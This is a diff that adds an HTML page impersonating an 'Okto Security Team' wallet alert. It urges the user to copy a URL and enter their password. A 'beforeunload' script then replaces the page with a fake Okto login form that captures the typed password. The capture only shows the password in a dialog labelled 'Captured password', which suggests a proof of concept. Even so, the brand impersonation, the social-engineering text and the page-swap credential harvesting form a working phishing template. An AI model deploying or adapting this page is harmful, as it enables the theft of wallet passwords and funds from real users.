@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Okto Wallet Notification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background: linear-gradient(to bottom, #6D5DFB, #49BDFE);
+        color: white;
+        text-align: center;
+        padding: 40px 20px;
+      }
+      textarea {
+        box-sizing: border-box;
+        width: 100%;
+        margin-top: 10px;
+        padding: 10px;
+        border-radius: 8px;
+        border: none;
+        resize: none;
+        font-size: 14px;
+      }
+      #copyButton {
+        margin-top: 15px;
+        padding: 10px 20px;
+        background-color: #ffffff;
+        color: #6D5DFB;
+        font-weight: bold;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+      }
+      #copyButton:hover {
+        background-color: #f0f0f0;
+      }
+      img.logo {
+        width: 80px;
+        margin-bottom: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <img src="https://docs.okto.tech/images/brand-kit/icons/icon.png" alt="Okto Logo" class="logo" />
+    <h3>Okto Security Team</h3>
+    <p>
+      We detected unusual activity from your Wallet<br />
+      <textarea rows="2">https://okto.tech:81</textarea>
+    </p>
+    <p>
+      (To protect your Okto Wallet, please copy and paste the URL into the address bar, then enter your password.)
+    </p>
+    <button id="copyButton">Copy URL</button>
+
+    <script>
+      document.getElementById("copyButton").onclick = function () {
+        const textArea = document.querySelector("textarea");
+        textArea.select();
+        document.execCommand("copy");
+      };
+
+      addEventListener("beforeunload", () => {
+        document.title = "Okto Login";
+        document.body.innerHTML = `
+        <div class="container">
+          <h2>Welcome back!</h2>
+          <p>Log in to your Okto wallet</p>
+          <form onsubmit="event.preventDefault(); const pw = document.getElementById('password').value; prompt('Captured password:', pw);">
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button type="submit">Unlock</button>
+          </form>
+        </div>
+        <style>
+          body {
+            font-family: Arial, sans-serif;
+            background: #f0f4ff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+          }
+          .container {
+            background: #ffffff;
+            padding: 24px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 300px;
+            text-align: center;
+          }
+          input[type="password"], button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 6px;
+          }
+          button {
+            background-color: #6D5DFB;
+            color: white;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+          }
+          button:hover {
+            background-color: #594cda;
+          }
+        </style>`;
+      });
+    </script>
+  </body>
+</html>
